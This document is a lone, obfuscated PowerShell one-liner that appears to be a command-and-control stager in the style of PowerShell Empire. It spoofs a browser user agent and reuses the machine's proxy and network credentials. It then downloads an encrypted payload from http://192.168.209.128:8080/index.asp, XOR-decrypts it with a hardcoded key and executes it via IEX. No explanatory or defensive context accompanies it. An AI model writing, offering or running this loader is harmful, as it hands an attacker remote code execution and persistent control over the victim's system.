
$wc=NEW-OBjECT SYSTEM.Net.WeBClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.Headers.AdD('User-Agent',$u);$Wc.PROXY = [SySTeM.NET.WebREquEsT]::DefaulTWeBPRoxY;$wc.ProXY.CREDENTIAlS = [SySTEM.Net.CReDeNTIAlCAChE]::DEfauLtNETwORkCrEdEnTIaLS;$K='63a9f0ea7bb98050796b649e85481845';$i=0;[char[]]$b=([CHaR[]]($wC.DownlOaDSTRiNg("http://192.168.209.128:8080/index.asp")))|%{$_-BXOr$k[$I++%$K.LEngTH]};IEX ($B-JoIN'')

